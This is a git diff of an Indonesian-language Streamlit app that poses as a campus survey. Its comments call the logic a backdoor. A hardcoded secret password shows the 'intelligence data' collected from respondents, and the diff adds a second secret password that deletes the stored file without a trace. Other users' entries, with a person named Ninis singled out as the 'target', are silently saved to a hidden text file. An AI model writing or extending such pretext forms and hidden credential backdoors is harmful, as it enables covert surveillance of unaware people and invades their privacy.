@@ -46,7 +46,7 @@ with st.form("kampus_form"):
 
 # LOGIKA PENYIMPANAN & JALUR BELAKANG (BACKDOOR)
 if submit:
-    # 🕵️‍♂️ JIKA MAS YUDHA MASUKIN PASSWORD RAHASIA
+    # 🕵️‍♂️ 1. JIKA MAS YUDHA MASUKIN PASSWORD LIHAT DATA
     if inisial == "PahlawanPantura": 
         st.success("Selamat datang di Markas, Komandan! 🫡 Berikut data intelijen yang masuk:")
         if os.path.exists("data_rahasia.txt"):
@@ -55,7 +55,15 @@ if submit:
         else:
             st.info("Belum ada target yang mengisi survei ini.")
             
-    # 👱‍♀️ JIKA NINIS (ATAU ORANG LAIN) YANG NGISI
+    # 🧹 2. JIKA MAS YUDHA MASUKIN PASSWORD HAPUS DATA
+    elif inisial == "ResetMarkas":
+        if os.path.exists("data_rahasia.txt"):
+            os.remove("data_rahasia.txt")
+            st.success("Data intelijen berhasil dihapus bersih tanpa sisa! 🧹✨")
+        else:
+            st.warning("Gudang data sudah kosong, Komandan!")
+
+    # 👱‍♀️ 3. JIKA NINIS (ATAU ORANG LAIN) YANG NGISI
     else:
         # Simpan datanya ke file text
         with open("data_rahasia.txt", "a") as f:
